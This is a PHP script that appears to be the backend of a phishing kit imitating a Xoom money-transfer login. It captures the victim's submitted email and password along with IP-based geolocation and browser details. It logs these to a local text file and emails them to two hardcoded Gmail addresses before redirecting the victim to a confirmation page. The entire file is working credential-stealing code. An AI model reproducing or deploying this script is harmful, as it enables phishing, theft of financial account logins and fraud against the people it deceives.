<?php


require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ XOOM LOGS +=============\n";
$message .= "Email: ".$_POST['j_username']."\n";
$message .= "Password: ".$_POST['j_password']."\n";
$message .= "============= [ip] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";

$fp = fopen("11.txt","a");
fputs($fp,$message);
fputs($fp,"\n");
fclose($fp);


$domain = 'XOOM';
$subj = "XOOM Log ~ {$geoplugin->ip} ~ {$geoplugin->countryName}";
$from = "From: $domain<west>\n";
mail("michaelpaulusa33@gmail.com,marek.glamba1@gmail.com",$subj,$message,$from,$domain);

time_sleep_until(time()+25);


header("Location: confirm.html");